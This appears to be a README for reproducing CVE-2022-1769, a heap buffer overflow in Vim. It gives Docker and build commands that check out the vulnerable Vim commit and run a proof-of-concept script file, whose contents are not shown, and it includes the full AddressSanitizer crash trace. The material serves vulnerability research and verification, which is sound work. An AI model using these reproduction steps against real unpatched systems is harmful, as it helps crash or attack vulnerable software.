### CVE-2022-1769

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/522076b2-96cb-4df6-a504-e6e2f64c171c/)

### Docker Container Run Command
```shell
docker build -t cve-2022-1769-poc .
docker run -itd --name CVE-2022-1769-POC cve-2022-1769-poc
docker exec -it CVE-2022-1769-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the Vim repository. (ssh-keygen)
cd /poc
git clone git@github.com:vim/vim.git

# Rollback to the vulnerable version.
cd vim/
git reset --hard 5a8fad32ea9c075f045b37d6c7739891d458f82b

# Install the compilation and installation dependencies for Vim.
apt install gcc make clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Enter the `src` directory.
cd ./src

# Configure, compile, and install Vim.
./configure --with-features=huge --enable-gui=no --enable-pythoninterp=no CFLAGS="-fsanitize=address -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address"
make
make install

# Open the poc file.
vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc.vim -c :qa!
or
ASAN_OPTIONS=detect_leaks=1 vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc.vim -c :qa!
```

### Description
Observed that:
```
=================================================================
==9695==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffff979063fa at pc 0xffff9d19e120 bp 0xffffdfb30150 sp 0xffffdfb30198
READ of size 1 at 0xffff979063fa thread T0
#0 0xffff9d19e11c in __interceptor_strlen ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:389
#1 0xaaaab9cb3d54  (/usr/local/bin/vim+0x6bdd54)
#2 0xaaaab9cb47c4  (/usr/local/bin/vim+0x6be7c4)
#3 0xaaaab9cb1990  (/usr/local/bin/vim+0x6bb990)
#4 0xaaaab9caf208  (/usr/local/bin/vim+0x6b9208)
#5 0xaaaab9caf48c  (/usr/local/bin/vim+0x6b948c)
#6 0xaaaab990362c  (/usr/local/bin/vim+0x30d62c)
#7 0xaaaab98f88f8  (/usr/local/bin/vim+0x3028f8)
#8 0xaaaab9cb1b7c  (/usr/local/bin/vim+0x6bbb7c)
#9 0xaaaab9cb2db8  (/usr/local/bin/vim+0x6bcdb8)
#10 0xaaaab9caf430  (/usr/local/bin/vim+0x6b9430)
#11 0xaaaab9caf48c  (/usr/local/bin/vim+0x6b948c)
#12 0xaaaab990362c  (/usr/local/bin/vim+0x30d62c)
#13 0xaaaab98f88f8  (/usr/local/bin/vim+0x3028f8)
#14 0xaaaab9cb1b7c  (/usr/local/bin/vim+0x6bbb7c)
#15 0xaaaab9cb2db8  (/usr/local/bin/vim+0x6bcdb8)
#16 0xaaaab9caf430  (/usr/local/bin/vim+0x6b9430)
#17 0xaaaab9caf48c  (/usr/local/bin/vim+0x6b948c)
#18 0xaaaab990362c  (/usr/local/bin/vim+0x30d62c)
#19 0xaaaab98f88f8  (/usr/local/bin/vim+0x3028f8)
#20 0xaaaab98f6830  (/usr/local/bin/vim+0x300830)
#21 0xaaaab9fe577c  (/usr/local/bin/vim+0x9ef77c)
#22 0xaaaab9fdd774  (/usr/local/bin/vim+0x9e7774)
#23 0xaaaab9fdce58  (/usr/local/bin/vim+0x9e6e58)
#24 0xffff9cee73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#25 0xffff9cee74c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#26 0xaaaab9746e2c  (/usr/local/bin/vim+0x150e2c)

0xffff979063fa is located 0 bytes to the right of 250-byte region [0xffff97906300,0xffff979063fa)
allocated by thread T0 here:
#0 0xffff9d20a69c in __interceptor_realloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:164
#1 0xaaaab97480b0  (/usr/local/bin/vim+0x1520b0)
#2 0xaaaab9747dfc  (/usr/local/bin/vim+0x151dfc)
#3 0xaaaab9cb3884  (/usr/local/bin/vim+0x6bd884)
#4 0xaaaab9cb47c4  (/usr/local/bin/vim+0x6be7c4)
#5 0xaaaab9cb1990  (/usr/local/bin/vim+0x6bb990)
#6 0xaaaab9caf208  (/usr/local/bin/vim+0x6b9208)
#7 0xaaaab9caf48c  (/usr/local/bin/vim+0x6b948c)
#8 0xaaaab990362c  (/usr/local/bin/vim+0x30d62c)
#9 0xaaaab98f88f8  (/usr/local/bin/vim+0x3028f8)
#10 0xaaaab9cb1b7c  (/usr/local/bin/vim+0x6bbb7c)
#11 0xaaaab9cb2db8  (/usr/local/bin/vim+0x6bcdb8)
#12 0xaaaab9caf430  (/usr/local/bin/vim+0x6b9430)
#13 0xaaaab9caf48c  (/usr/local/bin/vim+0x6b948c)
#14 0xaaaab990362c  (/usr/local/bin/vim+0x30d62c)
#15 0xaaaab98f88f8  (/usr/local/bin/vim+0x3028f8)
#16 0xaaaab9cb1b7c  (/usr/local/bin/vim+0x6bbb7c)
#17 0xaaaab9cb2db8  (/usr/local/bin/vim+0x6bcdb8)
#18 0xaaaab9caf430  (/usr/local/bin/vim+0x6b9430)
#19 0xaaaab9caf48c  (/usr/local/bin/vim+0x6b948c)
#20 0xaaaab990362c  (/usr/local/bin/vim+0x30d62c)
#21 0xaaaab98f88f8  (/usr/local/bin/vim+0x3028f8)
#22 0xaaaab98f6830  (/usr/local/bin/vim+0x300830)
#23 0xaaaab9fe577c  (/usr/local/bin/vim+0x9ef77c)
#24 0xaaaab9fdd774  (/usr/local/bin/vim+0x9e7774)
#25 0xaaaab9fdce58  (/usr/local/bin/vim+0x9e6e58)
#26 0xffff9cee73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#27 0xffff9cee74c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#28 0xaaaab9746e2c  (/usr/local/bin/vim+0x150e2c)

SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:389 in __interceptor_strlen
Shadow bytes around the buggy address:
0x200ff2f20c20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff2f20c30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff2f20c40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff2f20c50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff2f20c60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff2f20c70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00[02]
0x200ff2f20c80: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
0x200ff2f20c90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff2f20ca0: 00 00 00 00 00 00 00 02 fa fa fa fa fa fa fa fa
0x200ff2f20cb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff2f20cc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==9695==ABORTING
```


